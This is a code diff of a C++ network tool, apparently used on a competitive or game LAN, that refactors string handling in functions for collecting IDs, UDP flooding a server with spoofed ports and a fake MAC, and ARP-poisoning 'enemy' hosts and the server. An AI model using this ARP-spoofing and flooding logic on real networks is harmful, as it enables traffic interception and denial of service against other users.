@@ -98,7 +98,7 @@ void CommandManager::CollectIds(std::string message) {
   int i = 0;
 
   for (auto& it : enemy_arp_table) {
-    if (IsTeamIp(std::string(it.first))) {
+    if (IsTeamIp(it.first)) {
       continue;
     }
 
@@ -108,8 +108,9 @@ void CommandManager::CollectIds(std::string message) {
     u_char* message = packet + header_length;
     memcpy(message, payload, length);
 
-    WriteUdp(length, packet, server_port, client_port, it.second,
-             server_mac, strdup(server_ip.c_str()), it.first);
+    WriteUdp(length, packet, server_port, client_port,
+             strdup(it.second.c_str()), strdup(server_mac.c_str()),
+             strdup(server_ip.c_str()), strdup(it.first.c_str()));
 
     if (pcap_sendpacket(pcap, packet, length + header_length) != 0) {
       std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
@@ -145,7 +146,7 @@ void CommandManager::Flood(std::string message) {
     return;
   }
 
-  if (server_mac == NULL) {
+  if (server_mac == "") {
     std::cout << "No server MAC found, have you scanned the network?";
     std::cout << std::endl;
     return;
@@ -171,8 +172,9 @@ void CommandManager::Flood(std::string message) {
     u_char* message = packet + header_length;
     memcpy(message, payload, length);
 
-    WriteUdp(length, packet, (client_port + i), server_port, server_mac,
-             (char*) "aabbccddeeff", ip, strdup(server_ip.c_str()));
+    WriteUdp(length, packet, (client_port + i), server_port,
+             strdup(server_mac.c_str()), (char*) "aabbccddeeff", ip,
+             strdup(server_ip.c_str()));
 
     if (pcap_sendpacket(pcap, packet, length + header_length) != 0) {
       std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
@@ -207,10 +209,8 @@ void CommandManager::PoisonEnemies(std::string message) {
     return;
   }
 
-  char* spoof_ip = strdup(server_ip.c_str());
-  char* spoof_mac = our_mac;
-  std::unordered_map<char*, char*> spoof_addresses = {
-    {spoof_ip, spoof_mac}
+  std::unordered_map<std::string, std::string> spoof_addresses = {
+    {server_ip, our_mac}
   };
   u_long duration = 5;
 
@@ -230,21 +230,22 @@ void CommandManager::PoisonServer(std::string message) {
     return;
   }
 
-  if (server_mac == NULL) {
+  if (server_mac == "") {
     std::cout << "No server MAC found, have you scanned the network?";
     std::cout << std::endl;
     return;
   }
 
-  char* spoof_mac = our_mac;
-  std::unordered_map<char*,char*> victim_address = {
-    {strdup(server_ip.c_str()), server_mac}
+  std::unordered_map<std::string, std::string> victim_address = {
+    {server_ip, server_mac}
   };
-  std::unordered_map<char*, char*> spoof_addresses;
+
+  std::string spoof_mac = our_mac;
+  std::unordered_map<std::string, std::string> spoof_addresses;
 
   for (auto& it : enemy_arp_table) {
-    char* spoof_ip = it.first;
-    spoof_addresses.insert({spoof_ip, spoof_mac});
+    std::string spoof_ip = it.first;
+    spoof_addresses[spoof_ip] = spoof_mac;
   }
 
   u_long duration = 5;
